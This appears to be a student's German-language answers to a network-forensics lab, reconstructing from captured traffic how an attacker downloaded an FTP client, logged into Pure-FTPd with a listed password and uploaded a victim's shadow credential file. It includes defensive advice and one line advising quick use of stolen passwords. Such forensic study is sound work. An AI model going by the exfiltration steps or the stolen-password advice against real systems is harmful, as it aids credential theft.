1. FTP upload
   a) 172.17.0.3
   b) GET /alpine/v3.11/main/x86_64/lftp-4.8.4-r2.apk (ftp client download)
   c) ftp-upload von victims/172.17.0.2/shadow (vermutliche credentials)
   d) Er lädt einen FTP-Client herunter und meldet sich anschließend als "hackerman" mit dem Passwort "hackH4ckhacK" am Pure-FTPd an und erstellt dort folgende Ordner "victims/172.17.0.2" anschließend läd er in diesen Ordner eine Datei mit dem Namen "Shadow"
   STOR victims/172.17.0.2/shadow
2. hackH4ckhacK
3. Bessere Passwörter verwenden. Firewall und Pure-FTPd Einstellungen anpassen.
4. Sämtliche Passwörter zu ersetzten
5. Die erbeuteten Passwörter möglichst schnell auszuprobieren da sie vermutlich geändert werden sobald bekannt wird das sie gestohlen wurden. 
   
   ![[Pasted image 20231020085919.png]]
   ![[Pasted image 20231020085939.png]]